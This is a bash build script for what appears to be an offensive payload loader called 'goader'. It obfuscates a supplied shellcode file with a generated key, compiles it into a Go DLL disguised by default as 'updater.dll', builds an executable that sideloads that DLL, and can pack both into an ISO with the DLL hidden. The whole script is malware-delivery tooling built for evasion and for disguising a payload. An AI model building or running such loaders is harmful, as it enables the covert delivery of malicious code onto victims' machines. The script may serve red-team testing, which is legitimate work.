#!/bin/bash
rm payloads/*.*
command -v go > /dev/null || { \
    echo "[!] Go is required, please install it"; exit 1; }
if [[ $# -lt 1 ]]; then
    echo "[!] Invalid number or arguments."
    echo "Usage:"
    echo "$0 /path/to/payload.bin"
    exit 1
fi
command -v goversioninfo > /dev/null || { \
    echo "[-] goversioninfo needs to be installed, installing now"; \
    go install \
    github.com/josephspurrier/goversioninfo/cmd/goversioninfo@latest; \
}
isofilename=${3:-awesome.iso}
output_dll=${2:-updater.dll}
sc_fullpath=$(readlink -f "$1")
echo "[+] Full path of payload file: $sc_fullpath"
cd sc_obfuscator || exit 1
echo "[+] Generating key file..."
go generate
echo "[+] Jumbling shellcode and writing to DLL generator..."
go run sc_obfuscator -payload "$sc_fullpath"
echo "[+] Payload file written"
echo "[+] Copying key file to DLL directory..."
cp key.bin ../goDLL/
cd ../goDLL || exit 1
echo "[+] Building the DLL.."
./build_dll_on_linux.sh "$output_dll"
echo "[+] Done, $output_dll should be in the goDLL directory"
echo "[+] Compiling sideload executable now"
cd ../goEXE
./build_exe_on_linux.sh "$output_dll"
mv goader.exe ../payloads/
mv ../goDLL/$output_dll ../payloads/
if [[ $# -eq 3 ]]; then
    echo "[+] Iso file will be generated"
    cd ../payloads
    mkisofs -o $isofilename  -V "You've Been GOadered" -hidden "$output_dll" -allow-lowercase -l * 
    echo "[+] Iso file created with filename $isofilename"
fi
echo "[+] WOOOOO, have a nice day!"
